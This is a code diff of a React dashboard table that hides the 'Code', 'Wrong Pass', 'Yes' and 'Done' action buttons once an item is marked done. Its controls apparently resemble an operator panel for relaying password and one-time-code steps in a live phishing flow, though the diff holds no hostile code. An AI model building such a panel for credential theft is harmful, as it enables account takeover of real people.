@@ -108,73 +108,79 @@ export default function DashboardDataTable() {
                 <div>Pending..</div>
               ) : (
                 <div className="flex gap-2">
-                  <button
-                    onClick={async () => {
-                      setPending({
-                        state: true,
-                        index: index,
-                      });
-                      let code = prompt("code");
-                      await changeState(item._id, "code", code);
-                      await getData();
-                      setPending({
-                        state: false,
-                      });
-                    }}
-                    className="bg-blue-600 rounded-3xl py-1 px-3 text-sm md:text-md "
-                  >
-                    Code
-                  </button>
-                  <button
-                    onClick={async () => {
-                      setPending({
-                        state: true,
-                        index: index,
-                      });
+                  {item.state == "done" ? (
+                    ""
+                  ) : (
+                    <>
+                      <button
+                        onClick={async () => {
+                          setPending({
+                            state: true,
+                            index: index,
+                          });
+                          let code = prompt("code");
+                          await changeState(item._id, "code", code);
+                          await getData();
+                          setPending({
+                            state: false,
+                          });
+                        }}
+                        className="bg-blue-600 rounded-3xl py-1 px-3 text-sm md:text-md "
+                      >
+                        Code
+                      </button>
+                      <button
+                        onClick={async () => {
+                          setPending({
+                            state: true,
+                            index: index,
+                          });
 
-                      await changeState(item._id, "inCorrect");
-                      await getData();
-                      setPending({
-                        state: false,
-                      });
-                    }}
-                    className="bg-red-600 rounded-3xl text-nowrap text-sm md:text-lg py-1 px-3"
-                  >
-                    Wrong Pass
-                  </button>
-                  <button
-                    onClick={async () => {
-                      setPending({
-                        state: true,
-                        index: index,
-                      });
-                      await changeState(item._id, "yes");
-                      await getData();
-                      setPending({
-                        state: false,
-                      });
-                    }}
-                    className="bg-blue-600 rounded-3xl py-1 px-3"
-                  >
-                    Yes
-                  </button>
-                  <button
-                    onClick={async () => {
-                      setPending({
-                        state: true,
-                        index: index,
-                      });
+                          await changeState(item._id, "inCorrect");
+                          await getData();
+                          setPending({
+                            state: false,
+                          });
+                        }}
+                        className="bg-red-600 rounded-3xl text-nowrap text-sm md:text-lg py-1 px-3"
+                      >
+                        Wrong Pass
+                      </button>
+                      <button
+                        onClick={async () => {
+                          setPending({
+                            state: true,
+                            index: index,
+                          });
+                          await changeState(item._id, "yes");
+                          await getData();
+                          setPending({
+                            state: false,
+                          });
+                        }}
+                        className="bg-blue-600 rounded-3xl py-1 px-3"
+                      >
+                        Yes
+                      </button>
+                      <button
+                        onClick={async () => {
+                          setPending({
+                            state: true,
+                            index: index,
+                          });
 
-                      await changeState(item._id, "done");
-                      await getData();
-                      setPending({
-                        state: false,
-                      });
-                    }}
-                    className="bg-green-600 rounded-3xl py-1 px-3"
-                  >
-                    Done
-                  </button>
+                          await changeState(item._id, "done");
+                          await getData();
+                          setPending({
+                            state: false,
+                          });
+                        }}
+                        className="bg-green-600 rounded-3xl py-1 px-3"
+                      >
+                        Done
+                      </button>
+                    </>
+                  )}
                 </div>
               )}
             </div>
